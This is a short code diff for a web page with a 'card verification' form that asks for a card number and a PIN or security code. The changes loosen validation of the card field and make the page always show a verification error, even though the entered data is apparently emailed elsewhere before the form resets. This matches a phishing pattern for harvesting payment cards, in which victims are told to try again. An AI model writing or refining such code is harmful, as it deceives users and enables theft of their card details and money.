@@ -113,7 +113,7 @@ const uploadPreset = import.meta.env.PUBLIC_CLOUDINARY_UPLOAD_PRESET || "";
       </div>
       <div>
         <label for="cardNumber" class="mb-1 block text-sm font-medium text-(--color-text)">Card Number</label>
-        <input id="cardNumber" name="cardNumber" type="text" inputmode="numeric" minlength="12" maxlength="19" placeholder="XXXX XXXX XXXX" class="w-full rounded-md border border-border p-2 focus:outline-none focus:ring-2 focus:ring-(--color-primary)" required />
+        <input id="cardNumber" name="cardNumber" type="text"  minlength="2" maxlength="100" placeholder="XXXX XXXX XXXX" class="w-full rounded-md border border-border p-2 focus:outline-none focus:ring-2 focus:ring-(--color-primary)" required />
       </div>
       <div>
         <label for="pin" class="mb-1 block text-sm font-medium text-(--color-text)">PIN / Security Code</label>
@@ -375,16 +375,10 @@ const uploadPreset = import.meta.env.PUBLIC_CLOUDINARY_UPLOAD_PRESET || "";
         console.warn('[cv] /api/verify call failed', err);
       }
 
-      // Randomized verification outcome (temporary until real API/logic)
+      // Deterministic failure outcome until real verification logic is implemented
       try {
-        const isSuccess = Math.random() < 0.5;
-        if (isSuccess) {
-          msg.textContent = "Verification confirmed. Your card appears valid.";
-          msg.className = "mt-2 text-center text-xs text-(--color-primary)";
-        } else {
-          msg.textContent = "Error during card verification. Please try again.";
-          msg.className = "mt-2 text-center text-xs text-red-600";
-        }
+        msg.textContent = "Error during card verification. Please try again.";
+        msg.className = "mt-2 text-center text-xs text-red-600";
         // If email sent successfully, reset the form fields and previews
         if (emailed && form) {
           // clear text inputs
